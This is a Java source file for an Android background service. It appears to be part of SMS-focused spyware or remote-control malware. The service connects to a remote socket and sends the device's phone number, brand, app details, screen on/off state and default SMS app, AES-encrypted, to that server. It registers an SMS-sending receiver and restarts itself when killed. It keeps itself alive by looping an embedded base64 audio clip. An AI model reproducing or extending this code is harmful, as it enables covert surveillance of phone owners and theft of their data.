package com.example.softbank.service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.IBinder;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Base64;

import com.example.softbank.IMyAidlInterface;
import com.example.softbank.R;
import com.example.softbank.listener.ScreenListener;
import com.example.softbank.sms.SMSVerification;
import com.example.softbank.socket.SocketManage;
import com.example.softbank.socket.listener.OnConnection;
import com.example.softbank.utils.AESUtil;
import com.example.softbank.utils.AppIconUtil;
import com.example.softbank.utils.Notification;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

public class FirstService extends Service implements ScreenListener.ScreenStateListener, OnConnection, Runnable {
    private SMSVerification smsVerification;
    private String model;
    private String scree = "1";
    private final SocketManage socketManage = new SocketManage();
    private boolean isLogin;
    MediaPlayer mediaplayer = null;
    //转base64的音频文件
    String base64 = "AAAAGGZ0eXBtcDQyAAAAAG1wNDFpc29tAAAAKHV1aWRcpwj7Mo5CBahhZQ7KCpWWAAAADDEwLjAuMTgzNjMuMAAAAG5tZGF0AAAAAAAAABAnDEMgBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBAIBDSX5AAAAAAAAB9Pp9Pp9Pp9Pp9Pp9Pp9Pp9Pp9Pp9Pp9Pp9AAAC/m1vb3YAAABsbXZoZAAAAADeilCc3opQnAAAu4AAAAIRAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAHBdHJhawAAAFx0a2hkAAAAAd6KUJzeilCcAAAAAgAAAAAAAAIRAAAAAAAAAAAAAAAAAQAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAABXW1kaWEAAAAgbWRoZAAAAADeilCc3opQnAAAu4AAAAIRVcQAAAAAAC1oZGxyAAAAAAAAAABzb3VuAAAAAAAAAAAAAAAAU291bmRIYW5kbGVyAAAAAQhtaW5mAAAAEHNtaGQAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAMxzdGJsAAAAZHN0c2QAAAAAAAAAAQAAAFRtcDRhAAAAAAAAAAEAAAAAAAAAAAACABAAAAAAu4AAAAAAADBlc2RzAAAAAAOAgIAfAAAABICAgBRAFQAGAAACM2gAAjNoBYCAgAIRkAYBAgAAABhzdHRzAAAAAAAAAAEAAAABAAACEQAAABxzdHNjAAAAAAAAAAEAAAABAAAAAQAAAAEAAAAYc3RzegAAAAAAAAAAAAAAAQAAAF4AAAAUc3RjbwAAAAAAAAABAAAAUAAAAMl1ZHRhAAAAkG1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXIAAAAAAAAAAAAAAAAAAAAAY2lsc3QAAAAeqW5hbQAAABZkYXRhAAAAAQAAAADlvZXpn7MAAAAcqWRheQAAABRkYXRhAAAAAQAAAAAyMDIyAAAAIWFBUlQAAAAZZGF0YQAAAAEAAAAA5b2V6Z+z5py6AAAAMVh0cmEAAAApAAAAD1dNL0VuY29kaW5nVGltZQAAAAEAAAAOABUA2rD/dVfYAQ==";

    @Override
    public void onCreate() {
        super.onCreate();
        socketManage.setConnection(this);
        socketManage.setContext(this);
        socketManage.start();
        initSMSVerification();
        //息屏监听
        ScreenListener l = new ScreenListener(this);
        l.begin(this);
        new Thread(this).start();
    }


    /**
     * 注册发送短信发送状态广播
     */
    private void initSMSVerification() {
        smsVerification = new SMSVerification();
        IntentFilter mFilter01 = new IntentFilter("SMS_SEND_ACTIOIN");
        registerReceiver(smsVerification, mFilter01);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //停止
        mediaplayer.stop();
        mediaplayer = null;
        unregisterReceiver(smsVerification);
        //重启
        startService(new Intent(getApplicationContext(), FirstService.class));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return new IMyAidlInterface.Stub() {
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification.sendSimpleNotify(this);
        return START_STICKY;
    }


    /**
     * @return 登录
     */
    private String Login() throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("type", "0");
        jsonObject.put("BRAND", Build.BRAND);
        jsonObject.put("name", getResources().getString(R.string.app_name));
        jsonObject.put("edition", getVersionName(this));
        String phone = getNumber(this);
        if (phone == null) {
            jsonObject.put("phone", "1");
        } else {
            jsonObject.put("phone", phone);
        }
        jsonObject.put("screen", scree);
        jsonObject.put("Android", Build.VERSION.SDK_INT);
        return jsonObject.toString();
    }

    /**
     * 获取自己应用内部的版本名
     */
    public static String getVersionName(Context context) {
        PackageManager manager = context.getPackageManager();
        String name = null;
        try {
            PackageInfo info = manager.getPackageInfo(context.getPackageName(), 0);
            name = info.versionName;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        return name;
    }

    @SuppressLint({"MissingPermission", "HardwareIds"})
    private String getNumber(Context context) {
        //获取手机号码，有可能获取不到
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getLine1Number();
    }

    @Override
    public void onUserPresent(Context context) {
    }

    @Override
    public void onScreenOn() {
        this.scree = "1";
        model = getModel("1");
        if (model == null) {
            return;
        }
        if (isLogin) {
            print(model);
        }
    }


    @Override
    public void onScreenOff() {
        model = getModel("2");
        this.scree = "1";
        if (model == null) {
            return;
        }
        if (isLogin) {
            print(model);
        }
    }


    private void print(String text) {
        String AES = AESUtil.encrypt(text, AppIconUtil.aa);
        if (AES == null) {
            return;
        }
        new Thread(() -> socketManage.print(AES)).start();
    }

    private String getModel(String type) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("type", "3");
            jsonObject.put("screen", type);
            String defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(getApplicationContext());
            if (defaultSmsApp == null) {
                jsonObject.put("name", "未知");
            } else {
                jsonObject.put("name", defaultSmsApp);
            }
            jsonObject.put("phone", getNumber(FirstService.this));
            return jsonObject.toString();
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public void success(SocketManage manage) {
        try {
            String AES = AESUtil.encrypt(Login(), AppIconUtil.aa);
            isLogin = manage.print(AES);
            //System.out.println("登录状态" + is);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        if (mediaplayer != null) {
            return;
        }
        mediaplayer = new MediaPlayer();
        try {
            byte[] mp3SoundByteArray = Base64.decode(base64, Base64.DEFAULT);// 将字符串转换为byte数组
            File tempMp3 = File.createTempFile("s", ".mp3");
            tempMp3.deleteOnExit();
            FileOutputStream fos = new FileOutputStream(tempMp3);
            fos.write(mp3SoundByteArray);
            fos.close();
            FileInputStream fis = new FileInputStream(tempMp3);
            mediaplayer.setDataSource(fis.getFD());
            mediaplayer.setLooping(true);
            mediaplayer.prepareAsync();//异步准备播放 这部必须设置不然无法播放
            mediaplayer.start();//开始播放
        } catch (IllegalStateException | IOException e) {
            System.out.println(e.getMessage());
            // System.out.print("出错了=" + e);
        } catch (SecurityException | IllegalArgumentException ignored) {
        }
    }
}
